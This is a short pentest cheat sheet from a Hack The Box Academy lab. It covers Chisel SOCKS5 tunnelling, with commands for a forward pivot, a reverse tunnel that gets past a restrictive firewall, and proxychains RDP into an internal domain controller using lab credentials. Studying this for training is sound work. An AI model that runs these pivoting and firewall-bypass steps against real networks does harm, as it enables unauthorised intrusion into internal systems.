SOCKS5 Tunneling with Chisel
############################

Description
***********

Chisel is a TCP/UDP tunneling tool written in Go.  It uses HTTP to transport data that is secured with SSH

Installation
************

.. code-block:: console

    git clone https://github.com/jpillora/chisel.git
    cd chisel
    go build
    go install


Usage
*****


Case 1
======

Creating a tunnel to a pivot host


**Step 1** Copy the binary to the pivot host and start the server with
 
 .. code-block:: console

    ./chisel server -v -p 1234 --socks5


**Step 2** On the attack machine start the client to create the tunnel

.. code-block:: console

     ./chisel client -v 10.129.202.64:1234 socks

**Step 3** Edit your /etc/proxychains.conf file to reflect this setting at the bottom

.. code-block:: console

    [ProxyList]
    # add proxy here ...
    # meanwile
    # defaults set to "tor"
    # socks4 	127.0.0.1 9050
    socks5 127.0.0.1 1080

The chisel client is listening on 1080

**Step 4** Pivot to the DC with proxychains

.. code-block:: console

    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

Case 2 
=======

Creating a reverse tunnel to bypass a restrictive firewall

**Step 1:** start the chisel server on the attack host

.. code-block:: console

    sudo ./chisel server --reverse -v -p 1234 --socks5

The using the pivot server start the client to connect

.. code-block:: console

    ./chisel client -v 10.10.14.17:1234 R:socks

As long as your /etc/proxychains.conf file has :

.. code-block:: console

    [ProxyList]
    # add proxy here ...
    # socks4    127.0.0.1 9050
    socks5 127.0.0.1 1080 

you can attempt a connection with:

.. code-block:: console

    proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

References
**********
https://academy.hackthebox.com/module/158/section/1437